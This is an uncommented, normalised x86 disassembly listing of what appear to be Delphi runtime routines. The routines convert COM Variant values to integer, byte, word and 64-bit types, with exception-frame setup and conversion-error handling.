lea eax [ ebp - 0x4 ]
call sub_40700c
retn
sub_411bfc
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_411c3a
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
call sub_415730
mov eax ebx
mov edx [ ebp - 0x4 ]
call sub_415b40
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_411c41
lea eax [ ebp - 0x4 ]
call sub_40700c
retn
sub_411c48
push ebx
push esi
push edi
mov esi ecx
mov ebx edx
mov edi eax
movzx eax [ ebx ]
mov edx eax
and dx 0xfff
cmp dx 0x14
jb r-xdata
mov edx esi
and dx 0xfff
cmp dx 0x14
jae r-xdata
mov edx ebx
mov eax edi
mov ecx 0x8
call sub_411d34
push esi
push 0x0
push 0x400
push edi
push edi
mov eax [ rw-data ]
mov eax [ eax ]
call eax
movzx edx [ ebx ]
mov ecx esi
call sub_411298
jmp r-xdata
mov edx esi
call sub_410e58
push esi
push 0x0
push 0x400
push ebx
push edi
mov eax [ rw-data ]
mov eax [ eax ]
call eax
movzx edx [ ebx ]
mov ecx esi
call sub_411298
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_411cc8
push ebx
push esi
push edi
push ebp
push ecx
mov esi ecx
mov ebx edx
mov edi eax
movzx ebp [ ebx ]
cmp bp 0x101
jne r-xdata
mov edx esp
mov eax ebp
call sub_416178
test al al
je r-xdata
mov edx ebx
mov eax edi
mov ecx esi
call sub_411aac
jmp r-xdata
mov edx esp
mov eax esi
call sub_416178
test al al
je r-xdata
push esi
mov ecx ebx
mov edx edi
mov eax [ esp + 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x1c ]
jmp r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx ebx
mov eax edi
mov ecx esi
call sub_411c48
mov ecx ebx
mov edx edi
mov eax [ esp ]
mov ebx [ eax ]
call [ ebx + 0x18 ]
jmp r-xdata
sub_411d34
push ebx
push esi
mov ebx edx
mov esi eax
movzx eax [ ebx ]
movzx edx ax
cmp ecx edx
jne r-xdata
cmp ax 0x400c
jne r-xdata
mov edx ebx
mov eax esi
call sub_411a68
pop esi
pop ebx
retn
mov edx ecx
cmp edx 0x14
ja r-xdata
mov eax [ ebx + 0x8 ]
mov edx eax
mov eax esi
call sub_411d34
jmp r-xdata
mov edx ecx
sub edx 0x100
je r-xdata
jmp [ edx * 4 + jump_table_411d79 ]
pop esi
pop ebx
retn
mov edx ebx
mov eax esi
call sub_411b64
jmp r-xdata
dec edx
je r-xdata
cmp [ ebx ] 0x1
jne r-xdata
mov eax esi
call sub_4113a4
jmp r-xdata
mov eax ebx
call sub_4126a4
mov edx eax
mov eax esi
call sub_415984
jmp r-xdata
mov eax ebx
call sub_4120f8
mov edx eax
mov eax esi
call sub_4158e4
jmp r-xdata
mov eax ebx
call sub_413a4c
add esp 0xfffffffc
fstp [ esp ]
fwait
mov eax esi
call sub_4159d0
jmp r-xdata
mov eax ebx
call sub_4136d4
add esp 0xfffffff8
fstp [ esp ]
fwait
mov eax esi
call sub_4159f4
jmp r-xdata
mov eax ebx
call sub_41438c
add esp 0xfffffff8
fistp [ esp ]
fwait
mov eax esi
call sub_415a20
jmp r-xdata
mov eax ebx
call sub_413e24
add esp 0xfffffff8
fstp [ esp ]
fwait
mov eax esi
call sub_415a4c
jmp r-xdata
mov edx ebx
mov eax esi
call sub_411b18
jmp r-xdata
mov eax ebx
call sub_4131c0
mov edx eax
mov eax esi
call sub_415a78
jmp r-xdata
mov eax ebx
call sub_412548
mov edx eax
mov eax esi
call sub_415964
jmp r-xdata
mov eax ebx
call sub_4125fc
mov edx eax
mov eax esi
call sub_415904
jmp r-xdata
mov eax ebx
call sub_41279c
mov edx eax
mov eax esi
call sub_415924
jmp r-xdata
mov eax ebx
call sub_412878
mov edx eax
mov eax esi
call sub_415944
jmp r-xdata
mov eax ebx
call sub_412bc8
push edx
push eax
mov eax esi
call sub_4159a4
jmp r-xdata
mov edx ebx
mov eax esi
call sub_411bb0
jmp r-xdata
mov edx ebx
mov eax esi
call sub_411bfc
jmp r-xdata
mov dx 0x101
call sub_410e58
jmp r-xdata
jmp r-xdata
mov eax esi
call sub_41163c
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov edx ebx
mov eax esi
call sub_411cc8
xor edx edx
mov ax 0x1
call sub_410e58
jmp r-xdata
sub_411f60
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_412003
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
lea eax [ ebp - 0x4 ]
call sub_415164
lea eax [ ebp - 0x8 ]
push eax
push 0x0
push 0x400
mov eax [ ebp - 0x4 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov edx eax
sub edx 0x80020005
je r-xdata
lea eax [ ebp - 0xc ]
mov edx [ ebp - 0x4 ]
call sub_4057d4
mov eax [ ebp - 0xc ]
lea edx [ ebp - 0x8 ]
call sub_409f30
test al al
jne r-xdata
sub edx 0x7ffdfffb
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41200a
lea eax [ ebp - 0xc ]
call sub_405530
lea eax [ ebp - 0x4 ]
call sub_405d28
retn
mov eax ebx
call sub_4131c0
and eax 0x7f
mov [ ebp - 0x8 ] eax
jmp r-xdata
movzx edx [ ebx ]
mov cx 0x3
call sub_411298
jmp r-xdata
sub_412014
push ebx
add esp 0xfffffff0
mov ebx eax
push esp
call VariantInit
push 0x3
push 0x0
push 0x400
push ebx
lea eax [ esp + 0x10 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
movzx edx [ ebx ]
mov cx 0x3
call sub_411298
mov eax [ esp + 0x8 ]
add esp 0x10
pop ebx
retn
sub_412050
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
mov ebx eax
lea eax [ ebp - 0x14 ]
push eax
call VariantInit
xor eax eax
push ebp
push sub_4120a4
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
lea eax [ ebp - 0x14 ]
call sub_411a68
lea eax [ ebp - 0x14 ]
call [ rw-data ]
lea eax [ ebp - 0x14 ]
call sub_4120f8
mov [ ebp - 0x4 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4120ab
lea eax [ ebp - 0x14 ]
call sub_41163c
retn
sub_4120b4
push ebx
push esi
push edi
add esp 0xffffffec
mov edi edx
mov esi eax
mov edx esp
movzx eax [ esi ]
call sub_416178
mov ebx eax
test bl bl
je r-xdata
mov eax ebx
add esp 0x14
pop edi
pop esi
pop ebx
retn
lea eax [ esp + 0x4 ]
push eax
call VariantInit
push 0x3
mov ecx esi
lea edx [ esp + 0x8 ]
mov eax [ esp + 0x4 ]
mov esi [ eax ]
call [ esi + 0x1c ]
mov eax [ esp + 0xc ]
mov [ edi ] eax
sub_4120f8
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
xor edx edx
push ebp
push sub_412519
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
movzx eax [ eax ]
movzx edx ax
cmp edx 0x14
ja r-xdata
mov edx [ ebp - 0x4 ]
mov edx eax
sub dx 0x100
je r-xdata
jmp [ edx * 4 + jump_table_41212b ]
mov eax [ ebp - 0x4 ]
call sub_411f60
mov [ ebp - 0x8 ] eax
jmp r-xdata
dec dx
je r-xdata
xor eax eax
mov [ ebp - 0x8 ] eax
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
movsx eax [ eax + 0x8 ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
fld [ eax + 0x8 ]
call sub_403450
push eax
sar eax 0x1f
cmp eax edx
pop eax
je r-xdata
mov eax [ ebp - 0x4 ]
fld [ eax + 0x8 ]
call sub_403450
push eax
sar eax 0x1f
cmp eax edx
pop eax
je r-xdata
mov eax [ ebp - 0x4 ]
fild [ eax + 0x8 ]
fdiv [ r-xdata ]
call sub_403450
push eax
sar eax 0x1f
cmp eax edx
pop eax
je r-xdata
mov eax [ ebp - 0x4 ]
fld [ eax + 0x8 ]
call sub_403450
push eax
sar eax 0x1f
cmp eax edx
pop eax
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_411f60
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
movsx eax [ eax + 0x8 ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
movsx eax [ eax + 0x8 ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x8 ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x8 ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
test eax eax
jns r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0xc ]
mov eax [ eax + 0x8 ]
push eax
sar eax 0x1f
cmp eax edx
pop eax
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
call sub_4120f8
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_412014
mov [ ebp - 0x8 ] eax
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_412050
mov [ ebp - 0x8 ] eax
jmp r-xdata
jmp r-xdata
xor eax eax
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov dx 0x3
mov ax 0x1
call sub_410e58
mov [ ebp - 0x8 ] eax
jmp r-xdata
call sub_404518
mov [ ebp - 0x8 ] eax
jmp r-xdata
call sub_404518
mov [ ebp - 0x8 ] eax
jmp r-xdata
call sub_404518
mov [ ebp - 0x8 ] eax
jmp r-xdata
call sub_404518
mov [ ebp - 0x8 ] eax
jmp r-xdata
call sub_404518
mov [ ebp - 0x8 ] eax
jmp r-xdata
call sub_404518
mov eax [ ebp - 0x8 ]
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov edx [ ebp - 0x4 ]
test ah 0x40
je r-xdata
lea edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_4120b4
test al al
jne r-xdata
mov edx [ ebp - 0x4 ]
movzx eax ax
and eax 0xffffbfff
cmp eax 0x14
ja r-xdata
mov eax [ ebp - 0x4 ]
call sub_412014
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x4 ]
call sub_412014
mov [ ebp - 0x8 ] eax
jmp r-xdata
jmp [ eax * 4 + jump_table_41234f ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
movsx eax [ eax ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
mov eax [ eax ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
fld [ eax ]
call sub_403450
push eax
sar eax 0x1f
cmp eax edx
pop eax
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
fld [ eax ]
call sub_403450
push eax
sar eax 0x1f
cmp eax edx
pop eax
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
fild [ eax ]
fdiv [ r-xdata ]
call sub_403450
push eax
sar eax 0x1f
cmp eax edx
pop eax
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
fld [ eax ]
call sub_403450
push eax
sar eax 0x1f
cmp eax edx
pop eax
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_411f60
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
movsx eax [ eax ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
movsx eax [ eax ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
movzx eax [ eax ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
movzx eax [ eax ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
mov eax [ eax ]
test eax eax
jns r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
mov edx [ eax + 0x4 ]
mov eax [ eax ]
push eax
sar eax 0x1f
cmp eax edx
pop eax
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
call sub_4120f8
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov [ ebp - 0x8 ] eax
jmp r-xdata
call sub_404518
mov [ ebp - 0x8 ] eax
jmp r-xdata
call sub_404518
mov [ ebp - 0x8 ] eax
jmp r-xdata
call sub_404518
mov [ ebp - 0x8 ] eax
jmp r-xdata
call sub_404518
mov [ ebp - 0x8 ] eax
jmp r-xdata
call sub_404518
mov [ ebp - 0x8 ] eax
jmp r-xdata
call sub_404518
sub_412548
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
movzx eax [ eax ]
sub ax 0x1
jb r-xdata
xor ebx ebx
jmp r-xdata
je r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
cmp [ rw-data ] 0x0
je r-xdata
sub ax 0xa
je r-xdata
xor ebx ebx
jmp r-xdata
mov dx 0x10
mov ax 0x1
call sub_410e58
mov ebx [ ebp - 0x4 ]
movzx ebx [ ebx + 0x8 ]
jmp r-xdata
sub ax 0x5
je r-xdata
mov ebx [ ebp - 0x4 ]
movzx ebx [ ebx + 0x8 ]
jmp r-xdata
jmp r-xdata
xor eax eax
push ebp
push sub_4125d6
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_4120f8
mov ebx eax
add ebx 0x80
cmp ebx 0xff
jbe r-xdata
add ebx 0xffffff80
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
call sub_404518
sub_4125fc
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
movzx eax [ eax ]
sub ax 0x1
jb r-xdata
xor ebx ebx
jmp r-xdata
je r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
cmp [ rw-data ] 0x0
je r-xdata
sub ax 0xa
je r-xdata
xor ebx ebx
jmp r-xdata
mov dx 0x11
mov ax 0x1
call sub_410e58
mov ebx [ ebp - 0x4 ]
movzx ebx [ ebx + 0x8 ]
jmp r-xdata
sub ax 0x6
je r-xdata
mov ebx [ ebp - 0x4 ]
movzx ebx [ ebx + 0x8 ]
jmp r-xdata
jmp r-xdata
xor eax eax
push ebp
push sub_412681
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_4120f8
mov ebx eax
cmp ebx 0xff
jbe r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
call sub_404518
sub_4126a4
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
movzx eax [ eax ]
cmp eax 0x11
ja r-xdata
xor eax eax
push ebp
push sub_412779
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_4120f8
mov ebx eax
add ebx 0x8000
cmp ebx 0xffff
jbe r-xdata
movzx eax [ eax + lookup_table_4126cb ]
jmp [ eax * 4 + jump_table_4126dd ]
add ebx 0xffff8000
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
call sub_404518
xor ebx ebx
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov ebx [ ebp - 0x4 ]
movzx ebx [ ebx + 0x8 ]
jmp r-xdata
mov ebx [ ebp - 0x4 ]
movzx ebx [ ebx + 0x8 ]
jmp r-xdata
mov ebx [ ebp - 0x4 ]
movsx ebx [ ebx + 0x8 ]
jmp r-xdata
mov ebx [ ebp - 0x4 ]
movzx ebx [ ebx + 0x8 ]
jmp r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
xor ebx ebx
jmp r-xdata
mov dx 0x2
mov ax 0x1
call sub_410e58
sub_41279c
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
movzx eax [ eax ]
cmp eax 0x12
ja r-xdata
xor eax eax
push ebp
push sub_412852
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_4120f8
mov ebx eax
cmp ebx 0xffff
jbe r-xdata
movzx eax [ eax + lookup_table_4127bf ]
jmp [ eax * 4 + jump_table_4127d2 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
call sub_404518
xor ebx ebx
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov ebx [ ebp - 0x4 ]
movzx ebx [ ebx + 0x8 ]
jmp r-xdata
mov ebx [ ebp - 0x4 ]
movzx ebx [ ebx + 0x8 ]
jmp r-xdata
mov ebx [ ebp - 0x4 ]
movzx ebx [ ebx + 0x8 ]
jmp r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
xor ebx ebx
jmp r-xdata
mov dx 0x12
mov ax 0x1
call sub_410e58
sub_412878
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
movzx eax [ eax ]
cmp eax 0x13
ja r-xdata
xor eax eax
push ebp
push sub_41293e
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_412bc8
test edx edx
je r-xdata
movzx eax [ eax + lookup_table_41289f ]
jmp [ eax * 4 + jump_table_4128b3 ]
mov ebx eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
call sub_404518
xor ebx ebx
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov ebx [ ebp - 0x4 ]
movsx ebx [ ebx + 0x8 ]
jmp r-xdata
mov ebx [ ebp - 0x4 ]
movzx ebx [ ebx + 0x8 ]
jmp r-xdata
mov ebx [ ebp - 0x4 ]
movzx ebx [ ebx + 0x8 ]
jmp r-xdata
mov ebx [ ebp - 0x4 ]
mov ebx [ ebx + 0x8 ]
jmp r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
xor ebx ebx
jmp r-xdata
mov dx 0x13
mov ax 0x1
call sub_410e58
sub_412964
push ebx
add esp 0xffffffe8
mov ebx eax
lea eax [ esp + 0x8 ]
push eax
call VariantInit
push 0x3
push 0x0
push 0x400
push ebx
lea eax [ esp + 0x18 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
test eax eax
jne r-xdata
push 0x5
push 0x0
push 0x400
push ebx
lea eax [ esp + 0x18 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
test eax eax
jne r-xdata
mov eax [ esp + 0x10 ]
cdq
mov [ esp ] eax
mov [ esp + 0x4 ] edx
jmp r-xdata
cmp eax 0x80020005
jne r-xdata
fld [ esp + 0x10 ]
call sub_403450
mov [ esp ] eax
mov [ esp + 0x4 ] edx
jmp r-xdata
mov eax [ esp ]
mov edx [ esp + 0x4 ]
add esp 0x18
pop ebx
retn
movzx edx [ ebx ]
mov cx 0x14
call sub_411298
mov [ esp ] 0x0
mov [ esp + 0x4 ] 0x0
mov eax ebx
call sub_4131c0
and eax 0x7f
xor edx edx
mov [ esp ] eax
mov [ esp + 0x4 ] edx
jmp r-xdata
sub_412a10
push ebp
mov ebp esp
add esp 0xffffffdc
push ebx
xor edx edx
mov [ ebp - 0x24 ] edx
mov [ ebp - 0x4 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_412afe
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
lea eax [ ebp - 0x4 ]
call sub_415164
lea eax [ ebp - 0x24 ]
mov edx [ ebp - 0x4 ]
call sub_4057d4
mov eax [ ebp - 0x24 ]
lea edx [ ebp - 0x10 ]
call sub_409f50
test al al
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_412b05
lea eax [ ebp - 0x24 ]
call sub_405530
lea eax [ ebp - 0x4 ]
call sub_405d28
retn
lea eax [ ebp - 0x14 ]
push eax
push 0x0
push 0x400
mov eax [ ebp - 0x4 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
test eax eax
jne r-xdata
lea eax [ ebp - 0x20 ]
push eax
push 0x0
push 0x400
mov eax [ ebp - 0x4 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
test eax eax
jne r-xdata
mov eax [ ebp - 0x14 ]
cdq
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
cmp eax 0x80020005
jne r-xdata
fld [ ebp - 0x20 ]
call sub_403450
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
movzx edx [ ebx ]
mov cx 0x14
call sub_411298
mov [ ebp - 0x10 ] 0x0
mov [ ebp - 0xc ] 0x0
mov eax ebx
call sub_4131c0
and eax 0x7f
xor edx edx
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
sub_412b10
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
mov ebx eax
lea eax [ ebp - 0x18 ]
push eax
call VariantInit
xor eax eax
push ebp
push sub_412b67
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
lea eax [ ebp - 0x18 ]
call sub_411a68
lea eax [ ebp - 0x18 ]
call [ rw-data ]
lea eax [ ebp - 0x18 ]
call sub_412bc8
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] edx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_412b6e
lea eax [ ebp - 0x18 ]
call sub_41163c
retn
sub_412b7c
push ebx
push esi
push edi
add esp 0xffffffec
mov edi edx
mov esi eax
mov edx esp
movzx eax [ esi ]
call sub_416178
mov ebx eax
test bl bl
je r-xdata
mov eax ebx
add esp 0x14
pop edi
pop esi
pop ebx
retn
lea eax [ esp + 0x4 ]
push eax
call VariantInit
push 0x14
mov ecx esi
lea edx [ esp + 0x8 ]
mov eax [ esp + 0x4 ]
mov esi [ eax ]
call [ esi + 0x1c ]
mov eax [ esp + 0xc ]
mov [ edi ] eax
mov eax [ esp + 0x10 ]
mov [ edi + 0x4 ] eax
sub_412bc8
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
xor edx edx
push ebp
push sub_412fd4
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
movzx eax [ eax ]
movzx edx ax
cmp edx 0x14
ja r-xdata
mov edx [ ebp - 0x4 ]
mov edx eax
sub dx 0x100
je r-xdata
jmp [ edx * 4 + jump_table_412bfb ]
mov eax [ ebp - 0x4 ]
call sub_412a10
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
dec dx
je r-xdata
mov [ ebp - 0x10 ] 0x0
mov [ ebp - 0xc ] 0x0
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
movsx eax [ eax + 0x8 ]
cdq
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
cdq
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
fld [ eax + 0x8 ]
call sub_403450
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
fld [ eax + 0x8 ]
call sub_403450
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
fild [ eax + 0x8 ]
fdiv [ r-xdata ]
call sub_403450
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
fld [ eax + 0x8 ]
call sub_403450
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_412a10
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
movsx eax [ eax + 0x8 ]
cdq
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
movsx eax [ eax + 0x8 ]
cdq
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x8 ]
xor edx edx
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x8 ]
xor edx edx
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
xor edx edx
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x8 ]
mov [ ebp - 0x10 ] edx
mov edx [ eax + 0xc ]
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
call sub_412bc8
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_412964
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_412b10
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
jmp r-xdata
mov [ ebp - 0x10 ] 0x0
mov [ ebp - 0xc ] 0x0
jmp r-xdata
mov dx 0x14
mov ax 0x1
call sub_410e58
mov eax [ ebp - 0x10 ]
mov edx [ ebp - 0xc ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov edx [ ebp - 0x4 ]
test ah 0x40
je r-xdata
lea edx [ ebp - 0x10 ]
mov eax [ ebp - 0x4 ]
call sub_412b7c
test al al
jne r-xdata
mov edx [ ebp - 0x4 ]
movzx eax ax
and eax 0xffffbfff
cmp eax 0x14
ja r-xdata
mov eax [ ebp - 0x4 ]
call sub_412964
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
mov eax [ ebp - 0x4 ]
call sub_412964
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
jmp [ eax * 4 + jump_table_412e1f ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
movsx eax [ eax ]
cdq
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
mov eax [ eax ]
cdq
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
fld [ eax ]
call sub_403450
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
fld [ eax ]
call sub_403450
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
fild [ eax ]
fdiv [ r-xdata ]
call sub_403450
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
fld [ eax ]
call sub_403450
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_412a10
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
movsx eax [ eax ]
cdq
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
movsx eax [ eax ]
cdq
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
movzx eax [ eax ]
xor edx edx
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
movzx eax [ eax ]
xor edx edx
mov [ ebp - 0x10 ] eax
